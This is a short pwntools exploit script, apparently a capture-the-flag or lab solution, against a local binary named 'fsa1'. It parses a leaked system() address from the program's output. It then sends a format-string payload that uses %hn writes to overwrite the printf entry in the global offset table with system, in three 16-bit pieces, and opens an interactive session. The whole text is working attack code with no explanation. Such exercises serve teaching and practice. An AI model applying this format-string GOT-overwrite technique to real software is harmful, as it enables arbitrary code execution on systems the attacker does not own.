from pwn import *

printf_got = 0x404020

r = process("./fsa1")

system = int(r.recvline()[2:-1], 16)
print(hex(system))

system_low = system & 0xffff
system_mid = (system & 0xffff0000) >> 16
system_high = (system & 0xffff00000000) >> 32

payload = b'%' + str(system_low).encode() + b'c%15$hn'
payload += b'%' + str(0x10000 + system_mid - system_low).encode() + b'c%16$hn'
payload += b'%' + str(0x10000 + system_high - system_mid).encode() + b'c%17$hn'

payload = payload.ljust(0x48, b'a')
payload += p64(printf_got)
payload += p64(printf_got + 2)
payload += p64(printf_got + 4)
pause()
r.send(payload)

r.interactive()